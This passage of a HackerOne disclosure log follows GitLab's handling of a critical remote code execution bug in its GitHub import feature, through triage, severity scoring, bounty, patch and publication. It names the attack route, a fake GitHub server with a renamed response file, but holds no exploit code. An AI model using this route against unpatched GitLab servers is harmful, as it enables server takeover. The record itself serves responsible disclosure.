`call'\",\"lib/gitlab/middleware/request_context.rb:21:in `call'\",\"lib/gitlab/middleware/webhook_recursion_detection.rb:15:in `call'\",\"config/initializers/fix_local_cache_middleware.rb:11:in `call'\",\"lib/gitlab/middleware/compressed_json.rb:26:in `call'\",\"lib/gitlab/middleware/rack_multipart_tempfile_factory.rb:19:in `call'\",\"lib/gitlab/middleware/sidekiq_web_static.rb:20:in `call'\",\"lib/gitlab/metrics/requests_rack_middleware.rb:77:in `call'\",\"lib/gitlab/middleware/release_env.rb:13:in `call'\"],\"user.username\":\"yvvdwf\",\"tags.program\":\"web\",\"tags.locale\":\"en\",\"tags.feature_category\":\"importers\",\"tags.correlation_id\":\"01GAQ3PT6KHK32N2PEJ213N9AY\"}\n\n==> /var/log/gitlab/gitlab-rails/production.log <==\n\nNoMethodError (undefined method `description' for []:Array):\n  /opt/gitlab/embedded/service/gitlab-rails/lib/gitlab/legacy_github_import/project_creator.rb:21:in `execute'\n  /opt/gitlab/embedded/service/gitlab-rails/app/services/import/github_service.rb:45:in `create_project'\n  /opt/gitlab/embedded/service/gitlab-rails/app/services/import/github_service.rb:24:in `execute'\n  /opt/gitlab/embedded/service/gitlab-rails/lib/api/import_github.rb:48:in `block in <class:ImportGithub>'\n...\n```\n\nI'll keep trying different things and attempting to reproduce, but again any updated instructions / fake server / video would be much appreciated!\n\n\nCheers,\nNick Malcolm\nGitLab Security Team",
      "automated_response": false,
      "created_at": "2022-08-18T00:00:53.513Z",
      "updated_at": "2022-08-18T00:00:53.513Z",
      "actor": {
        "username": "nmalcolm_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/nmalcolm_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/qugqy57v49704ukw2816cro62zrc/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 18024696,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportSeverityUpdated",
      "message": "- `AC:L` - it is simple to set up a fake GitHub server, and by default a GitLab install will permit GitHub imports\n- `PR:L` - an account with permission to import is required (e.g. a Developer)\n- `UI:N` - no user interaction is required\n- `S:C` - vulnerable component is GitLab web app, impacted component is the server\n- `C:H`, `I:H`, `A:H` - remote code execution  ",
      "automated_response": false,
      "created_at": "2022-08-18T01:48:59.702Z",
      "updated_at": "2022-08-18T01:48:59.702Z",
      "additional_data": {
        "old_severity": "Critical (10.0)",
        "new_severity": "Critical (9.9)",
        "old_severity_id": 1626213,
        "new_severity_id": 1626864
      },
      "actor": {
        "username": "nmalcolm_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/nmalcolm_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/qugqy57v49704ukw2816cro62zrc/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 18024747,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "Hi @yvvdwf \n\nThank you for submitting this report.\n\nWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab/-/issues/371098.  This issue will be made public 30 days following the release of a patch.\n\nGiven the severity of the report, we are paying an initial $1000 on triage. Congratulations!\n\nThe fix for your proof-of-concept server was to move `_repositories_356289002.res.body.txt` to `_api_v3_repositories_356289002.res.body.txt`.\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nNick Malcolm\nGitLab Security Team",
      "automated_response": false,
      "created_at": "2022-08-18T02:14:15.061Z",
      "updated_at": "2022-08-18T02:14:15.061Z",
      "actor": {
        "username": "nmalcolm_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/nmalcolm_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/qugqy57v49704ukw2816cro62zrc/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 18027003,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @nmalcolm_gitlab, I'm glad to hear that you were able to valid the finding. Thanks!",
      "automated_response": false,
      "created_at": "2022-08-18T08:01:44.099Z",
      "updated_at": "2022-08-18T08:01:44.099Z",
      "actor": {
        "username": "yvvdwf",
        "cleared": false,
        "verified": false,
        "url": "/yvvdwf",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ubqmt760dugarh527x4qc4mkdn4n/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 18036808,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @yvvdwf,\n\nWe would like to make sure that you are not testing this anymore. The test entries in Redis are causing issues in other places. Also in the future it would be preferred if such issues were tested on a local GitLab instance to avoid any impact to the production environment.\n\nThank you,\nDominic\nGitLab Security Team",
      "automated_response": false,
      "created_at": "2022-08-18T19:03:17.672Z",
      "updated_at": "2022-08-18T19:03:17.672Z",
      "actor": {
        "username": "dcouture",
        "cleared": false,
        "verified": false,
        "url": "/dcouture",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 18037147,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @dcouture ,\n\nI acknowledge receipt of the warning. Otherwise, I hope that the tests do not violate to the *Rules of Engagement, Testing, and Proof-of-concepts* policy as I intended to use and effect only my account `yvvdwf` and my private repository `yvvdwf/xss`.\n\nBest regards,",
      "automated_response": false,
      "created_at": "2022-08-18T19:50:47.084Z",
      "updated_at": "2022-08-18T19:50:47.084Z",
      "actor": {
        "username": "yvvdwf",
        "cleared": false,
        "verified": false,
        "url": "/yvvdwf",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ubqmt760dugarh527x4qc4mkdn4n/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 18038139,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thank you @yvvdwf. It's all good, I'm sure there were no intentional violation of the rules of engagement, but the testing did cause some stability issues in areas outside of your own repository. We're going to add some more specific wording in our policy to outline how RCE should be tested in the future.\n\nBest regards,\nDominic\nGitLab Security Team",
      "automated_response": false,
      "created_at": "2022-08-18T20:03:08.437Z",
      "updated_at": "2022-08-18T20:03:08.437Z",
      "actor": {
        "username": "dcouture",
        "cleared": false,
        "verified": false,
        "url": "/dcouture",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 18099882,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "ETA for fix:\n\nHi @yvvdwf,\n\nThe issue you reported is currently scheduled to be fixed by 2022-09-30.\n\nThank you again for contacting us!\n\nBest regards,\nGitLab Security Team\n",
      "automated_response": true,
      "created_at": "2022-08-24T04:04:10.418Z",
      "updated_at": "2022-08-24T04:04:10.418Z",
      "actor": {
        "username": "gitlab-securitybot",
        "cleared": false,
        "verified": false,
        "url": "/gitlab-securitybot",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 18112491,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BountyAwarded",
      "message": "We resolved our payment issues and I'm paying the initial 1000 that never went out. The rest of the bounty is coming soon.",
      "automated_response": false,
      "created_at": "2022-08-24T23:57:57.101Z",
      "updated_at": "2022-08-24T23:57:57.101Z",
      "actor": {
        "url": "/gitlab",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "GitLab"
        }
      },
      "bounty_currency": "usd",
      "genius_execution_id": null,
      "team_handle": "gitlab",
      "collaborator": {
        "username": "yvvdwf",
        "url": "/yvvdwf"
      }
    },
    {
      "id": 18272160,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "Hi @yvvdwf,\n\nApologies for the delay, this was a great find! Thank you again for the report! Your finding has been patched in GitLab version 15.3.1 and we are awarding a bounty. Congratulations!\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker. If you'd like to publicly disclose this report or details of it in a blog post or elsewhere, please allow 30 days to pass before doing so to give time to our customers to upgrade to a patched version.\n\nWe look forward to your next report!\n\nBest regards,\nDominic\nGitLab Security Team",
      "automated_response": false,
      "created_at": "2022-09-06T19:00:01.573Z",
      "updated_at": "2022-09-06T19:00:01.573Z",
      "actor": {
        "username": "dcouture",
        "cleared": false,
        "verified": false,
        "url": "/dcouture",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "yvvdwf",
        "url": "/yvvdwf"
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 18272165,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BountyAwarded",
      "message": "",
      "automated_response": false,
      "created_at": "2022-09-06T19:00:23.447Z",
      "updated_at": "2022-09-06T19:00:23.447Z",
      "actor": {
        "url": "/gitlab",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "GitLab"
        }
      },
      "bounty_currency": "usd",
      "genius_execution_id": null,
      "team_handle": "gitlab",
      "collaborator": {
        "username": "yvvdwf",
        "url": "/yvvdwf"
      }
    },
    {
      "id": 19089722,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2022-11-04T16:48:31.933Z",
      "updated_at": "2022-11-04T16:48:31.933Z",
      "first_to_agree": true,
      "actor": {
        "username": "yvvdwf",
        "cleared": false,
        "verified": false,
        "url": "/yvvdwf",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ubqmt760dugarh527x4qc4mkdn4n/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 19234145,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2022-11-16T01:10:35.709Z",
      "updated_at": "2022-11-16T01:10:35.709Z",
      "actor": {
        "username": "nmalcolm_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/nmalcolm_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/qugqy57v49704ukw2816cro62zrc/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 19234146,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2022-11-16T01:10:35.878Z",
      "updated_at": "2022-11-16T01:10:35.878Z",
      "actor": {
        "username": "nmalcolm_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/nmalcolm_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/qugqy57v49704ukw2816cro62zrc/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}